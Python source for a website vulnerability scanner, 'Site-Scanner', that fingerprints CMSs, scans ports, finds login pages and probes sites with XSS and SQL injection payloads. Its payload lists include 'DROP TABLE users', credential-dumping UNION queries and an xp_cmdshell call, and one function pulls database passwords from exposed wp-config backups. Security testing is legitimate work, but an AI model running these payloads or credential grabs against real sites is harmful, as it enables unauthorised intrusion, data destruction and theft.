# Site-Scanner - Website vulnerability assessment tool.
# Version: 1.5
# Date: March 21, 2024
# Copyright © Tal.M.

import requests
from bs4 import BeautifulSoup
import time
import requests
from urllib.parse import urlparse
import socket
import concurrent.futures
import json
from urllib.parse import urljoin
import re
from datetime import datetime
import signal
import sys

def signal_handler(sig, frame):
    print("\nShutting down...")
    time.sleep(1)
    exit(1)

def print_logo():
    with open("src/logo.txt", "r") as logo_file:
        logo = logo_file.read()
        print(logo)


def get_url():
    while True:
        try:
            url = input('\nEnter URL: ')

            if not url:
                print('Invalid URL')
            elif not url.startswith('http'):
                print('\033[31mInvalid URL\033[0m, Example: http://example.com')
            elif url.endswith('/'):
                url = url[:-1]
                return url
            else:
                return url
        except KeyboardInterrupt:
            print("\n\nShutting down...")
            time.sleep(1)
            exit(0)
        except Exception as e:
            print('An error occurred:', e)


def detect_cms(url, response):
    if response.status_code == 200:
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')

        with open("src/cms_metadata.json", "r") as metadata_file:
            cms_metadata = json.load(metadata_file)

        for cms, metadata in cms_metadata.items():
            for indicator in metadata["indicators"]:
                if indicator.lower() in html.lower():
                    return cms

        return "Unknown CMS"
    else:
        return "Error: Unable to fetch URL"

def extract_cms_version(html, cms):
    if cms.lower() == "vbulletin":
        version_match = re.search(r'<meta name="generator" content="vBulletin ([\d.]+)"', html)
        if version_match:
            return version_match.group(1)
    if cms.lower() == "wordpress":
        version_match = re.search(r'<meta name="generator" content="WordPress ([\d.]+)" />', html)
        if version_match:
            return version_match.group(1)
    if cms.lower() == "joomla":
        version_match = re.search(r'<meta name="generator" content="Joomla! - Open Source Content Management - Version ([\d.]+)">', html)
        if version_match:
            return version_match.group(1)
    return None

def find_wp_config_backup(base_url):
    try:
        wp_config_backup_url = urljoin(base_url, "/wp-config.php-bak")

        # Fetch the content of the wp-config.php.bak file
        response = requests.get(wp_config_backup_url)
        if response.status_code == 200:
            
            print("\n\033[31mMajor Leak Found!\033[0m\n")
            # Extract database configuration information
            wp_config_content = response.text
            db_name = wp_config_content.split("DB_NAME', '")[1].split("'")[0]
            db_user = wp_config_content.split("DB_USER', '")[1].split("'")[0]
            db_password = wp_config_content.split("DB_PASSWORD', '")[1].split("'")[0]
            db_host = wp_config_content.split("DB_HOST', '")[1].split("'")[0]
            # Print the database configuration information
            print(f"Database Name: {db_name}")
            print(f"Database User: {db_user}")
            print(f"Database Password: {db_password}")
            print(f"Database Host: {db_host}")
            print(f"\nFor more info: {wp_config_backup_url}")
            
    except requests.RequestException as e:
        print(f"Error fetching URL {wp_config_backup_url}: {e}")

def search_vulnerabilities(cms, version,url):
    if version:
        major_minor_version = ".".join(version.split(".")[:2])
        search_query = f"{cms}+{major_minor_version}"
    else:
        major_minor_version = ""
        search_query = f"{cms}"
        
    search_url = f"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={search_query}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }

    if cms_name=="WordPress":
                find_wp_config_backup(url)
    
    try:
        response = requests.get(search_url, headers=headers)
        response.raise_for_status()  # Raise an exception for non-200 status codes
        
        soup = BeautifulSoup(response.text, 'html.parser')
        cve_info = soup.find("div", class_="smaller", style="background-color:#e0dbd2; padding:3px; border:1px solid #706c60; margin-bottom:10px")
        
        if cve_info:
            cve_count = cve_info.find("b").text.strip()
            return f"\n\033[31m{cve_count}\033[0m CVE Records found for {cms} {major_minor_version}\nSee more at {search_url}"
        else:
            return f"\nNo CVE Records found for {cms} {major_minor_version}."
        
    except requests.RequestException as e:
        return f"Error: {str(e)}"

def search_login_variations(cms_name, url):
    with open("src/cms_variations.json", "r") as variations_file:
        cms_variations = json.load(variations_file)

    variations = cms_variations.get(cms_name.lower(), [])

    valid_login_page = None
    for variation in variations:
        response = requests.get(f"{url}{variation}")
        if response.status_code == 200:
            valid_login_page = f"{url}{variation}"
            break

    return valid_login_page

def get_ip(url):
    try:
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except Exception as e:
        print("Error:", e)
        return "N/A"

def get_server_info(res):
    try:
        response = res
        end_time = time.time()
        ip_address = get_ip(url)
        if response.status_code == 200:
            # Load Time Calculation.
            load_time = end_time - start_time
            server_headers = response.headers
            server = server_headers.get('Server', 'N/A')
            os = server_headers.get('X-Powered-By', 'N/A')

            print(f"\n\033[31mLoad Time:\033[0m {load_time:.1f} seconds")
            print(f"\033[31mIP Address:\033[0m {ip_address}")
            print(f"\033[31mServer Software:\033[0m {server}")
            print(f"\033[31mServer OS:\033[0m {os}")
        else:
            print('Failed to fetch URL:', response.status_code)
            time.sleep(1)
            exit(1)
    except requests.exceptions.RequestException as e:
        print("Error:", e)

def scan_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, port))
    sock.close()
    if result == 0:
        return port

def get_open_ports(ip_address):

    open_ports = []
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_port = {executor.submit(scan_port, ip_address, port): port for port in range(1, 1024)}
        for future in concurrent.futures.as_completed(future_to_port):
            port = future_to_port[future]
            if future.result() is not None:
                open_ports.append(port)

    return open_ports

def check_xss_vulnerability(url):
    payloads = [
        "<script>alert('XSS Vulnerable');</script>",
        "<img src='x' onerror='alert(\"XSS Vulnerable\")'>",
        "<a href='javascript:alert(\"XSS Vulnerable\")'>Click me</a>"
    ]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}

    response = requests.get(url, headers=headers)

    if response.status_code != 200:
        print("Failed to fetch the URL. Status Code:", response.status_code)
        return

    soup = BeautifulSoup(response.text, 'html.parser')

    # Testing input fields
    input_fields = soup.find_all('input')
    found_vulnerabilities = False

    for field in input_fields:
        for payload in payloads:
            data = {field.get('name'): payload}
            test_url = urljoin(url, field.get('action') or '') 
            test_response = requests.post(test_url, data=data, headers=headers)

            if payload in test_response.text:
                found_vulnerabilities = True
                print("Potential XSS vulnerability found in:", test_url)
                print("Payload:", payload)

    # Testing JS event attributes
    script_tags = soup.find_all(string=re.compile(r'on\w+=".*?"'))
    for tag in script_tags:
        for payload in payloads:
            test_url = urljoin(url, tag)
            test_response = requests.get(test_url, headers=headers)

            if payload in test_response.text:
                found_vulnerabilities = True
                print("Potential XSS vulnerability found in:", test_url)
                print("Payload:", payload)

    # Testing URL parameters
    for payload in payloads:
        test_url = url + "?" + payload
        test_response = requests.get(test_url, headers=headers)

        if payload in test_response.text:
            found_vulnerabilities = True
            print("Potential XSS vulnerability found in:", test_url)
            print("Payload:", payload)

    # No vulnerabilities found
    if not found_vulnerabilities:
        print("No XSS Vulnerabilities found.")

def is_valid_url(url):
    response = requests.head(url)
    return response.status_code == 200

def generate_test_urls(domain, patterns_file):
    test_urls = []

    # Read patterns from the JSON file
    with open(patterns_file, 'r') as file:
        patterns = json.load(file)

    # Generate variations based on patterns
    for pattern in patterns:
        full_url = urljoin(domain, pattern)

        # Check if the generated URL is valid
        test_urls.append(full_url)

    return test_urls

def check_sql_injection_vulnerability(url):
    payloads = [

        "'"
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "1' OR '1'='1' #",
        "1' OR '1'='1'/*",
        "1' OR '1'='1'/*",
        "1; DROP TABLE users --",
        "' OR 'x'='x",
        "UNION SELECT null, username, password FROM users --",
        "UNION ALL SELECT null, version(), database() --",

        "1' AND 1=convert(int, @@version) --",
        "' AND 1=convert(int, @@version) --",

        "1' WAITFOR DELAY '0:0:5' --",

        "1' AND 1=1 --",
        "1' AND 1=2 --",

        "1' UNION SELECT null, version(), null --",
        "1' UNION SELECT null, database(), null --",

        "1'; EXEC xp_cmdshell('nslookup example.com') --",

        "1' AND SLEEP(5) --",
        "1' AND 1=1; IF (1=1) WAITFOR DELAY '0:0:5' --",

        "1' AND IF(1=1, SLEEP(5), 0) --",
        "1' AND IF(1=1, BENCHMARK(5000000, SHA1(1)), 0) --"
    ]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    test_urls = generate_test_urls(url, "src/patterns.json")

    for test_url in test_urls:
        for payload in payloads:
            full_url = f"{test_url}{payload}" if '?' in test_url else f"{test_url}?param={payload}"
            response = requests.get(full_url, headers=headers)

            if "error" in response.text.lower() and response.status_code == 200 or "syntax error" in response.text.lower():
                print("SQL injection vulnerability found in:", test_url)
                print("Payload:", payload)

                # Printing the error message.
                soup = BeautifulSoup(response.text, 'html.parser')
                error_tag = soup.find(string=lambda text: "error" in text.lower() or "syntax error" in text.lower())
                if error_tag:
                    error_message = error_tag.strip()
                    print("Error message:", error_message)
                return 


def show_robots_txt(url):
    try:
        parsed_url = urlparse(url)
        robots_url = f"{parsed_url.scheme}://{parsed_url.netloc}/robots.txt"
        response = requests.get(robots_url)
        if response.status_code == 200:
            print("\nFetching robots.txt...\n")
            for line in response.text.split('\n'):
                if line.strip().startswith('Disallow:'):
                    print(line.strip())
        else:
            print("\nFailed to fetch robots.txt. Status Code:", response.status_code)
    except Exception as e:
        print("Error:", e)

def print_menu():
    print("\n\033[31m1.CMS Detection & Vulnerability Report\033[0m")
    print("\033[31m2.Admin Panel Auth Detection\033[0m")
    print("\033[31m3.Robots.txt Disallow Entries\033[0m")
    print("\033[31m4.Open Ports Scan\033[0m - Heavy Op")
    print("\033[31m5.XSS Detection\033[0m")
    print("\033[31m6.SQL Injection Detection\033[0m")
    print("\033[31m0.Exit\033[0m")




if __name__ == '__main__':
    print_logo()
    url = get_url() 

    print("Fetching URL...")
    start_time = time.time()
    response = requests.get(url)
    get_server_info(response)
    cms_name = detect_cms(url, response)

    while True:
        signal.signal(signal.SIGINT, signal_handler)
        print_menu()
        user = input("\033[32mSelect Task:\033[0m")
        # Switch case tasks
        if user == "1":
            print(f"\nDetecting CMS...")
            print(f" - {cms_name}")
            version = extract_cms_version(response.text, cms_name)
            if version is not None:
                print("Version: "+version)
            if cms_name != "Unkown CMS":
                print("\nSearching Vulnerabilities")
                print(search_vulnerabilities(cms_name, version, url))
            
        if user == "2":
            print("\nSearching for login page...")
            login_page = search_login_variations(cms_name, url)
            if login_page:
                print(" - " + login_page)
            else:
                print(" - Login page not found")

        if user == "3":
            show_robots_txt(url)

        if user == "4":
            print("\nSearching for Open Ports...")
            open_ports = get_open_ports(get_ip(url))
            if open_ports:
                print("Open Ports:", open_ports)
            else:
                print("No open ports found.")

        if user == "5":
            print("\nLooking for XSS Vulnerabilities...")
            check_xss_vulnerability(url)

        if user == "6":
            print("\nLooking for SQL Injection Vulnerabilities...")
            check_sql_injection_vulnerability(url)

        if user == "0":
            print("\nShutting down...")
            time.sleep(1)
            exit(1)
